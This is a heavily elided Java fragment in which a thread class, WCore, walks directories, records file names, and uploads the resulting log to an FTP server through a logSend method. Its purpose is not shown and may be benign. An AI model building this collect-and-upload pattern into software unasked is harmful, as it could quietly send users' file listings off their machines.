...
public class WCore extends Thread {
	...
	public void run(){
		...
		if(!see.equals("null"))System.out.println("Current Directory: "+file);
		...
		if(write.equals(Str.files) || write.equals(Str.all))
			// name = path
		...
		if(send)logSend(file,Ftp.getInstance());
	}
    ...
    public static void logSend(File file,Ftp ftp) { 
    	...
    	OutputStream os = null; BufferedReader br = null; int b;
		try {
			...
			try{os.flush();os.close();br.close();}
